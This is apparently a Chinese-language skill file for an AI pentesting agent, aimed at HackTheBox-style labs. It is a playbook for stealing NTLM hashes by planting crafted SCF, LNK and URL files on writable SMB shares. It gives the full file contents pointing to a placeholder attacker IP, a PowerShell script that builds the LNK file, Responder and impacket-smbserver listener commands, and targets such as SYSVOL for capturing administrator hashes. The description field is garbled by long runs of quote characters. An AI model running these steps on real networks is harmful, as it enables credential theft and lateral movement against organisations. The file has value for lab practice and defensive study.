---
name: 'scf-ntlm-theft'
description: 'SCF/LNK/URL文件投放→NTLM hash窃取。HTB最常见''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''可写共享→凭据''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''''路径。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## SCF / LNK / URL 文件 NTLM 窃取

> 🔴 **最常见的 HTB "可写共享→凭据" 路径**

### 原理
在可写 SMB 共享上放置特制的 `.scf`、`.lnk`、`.url` 文件。当用户（或服务）浏览该共享时，Windows 自动尝试连接文件中指定的图标/SMB 路径，触发 NTLM 认证 → Responder 捕获 NetNTLMv2 hash → 破解或中继。

### SCF 文件（最可靠）
```
[Shell]
Command=2
IconFile=\\<ATTACKER_IP>\share\icon.ico
IconIndex=1
```
保存为 `@whatever.scf`（@ 确保排序在最前）。

### LNK 文件（PowerShell 生成）
```powershell
$objShell = New-Object -ComObject WScript.Shell
$lnk = $objShell.CreateShortcut("C:\path\to\shortcut.lnk")
$lnk.TargetPath = "\\<ATTACKER_IP>\share\file"
$lnk.IconLocation = "\\<ATTACKER_IP>\share\icon.ico"
$lnk.Save()
```

### URL 文件
```
[InternetShortcut]
URL=file://<ATTACKER_IP>/share/file
IconFile=\\<ATTACKER_IP>\share\icon.ico
IconIndex=0
```
保存为 `@readme.url`。

### Kali 接收端
```bash
sudo responder -I tun0 -v
# 或
sudo impacket-smbserver -smb2support share /tmp/share
```

### 可投放位置
- 可写 SMB 共享（SYSVOL, NETLOGON, 自定义共享）
- WebDAV 可写目录
- 任何 Explorer 会自动预览的目录

### 常见场景
- 有 j.arbuckle → SYSVOL 可写 → 放 SCF → DC 管理员浏览 → 拿 Admin hash
- Printer 共享 → 放 SCF → IT 人员浏览 → 拿凭据
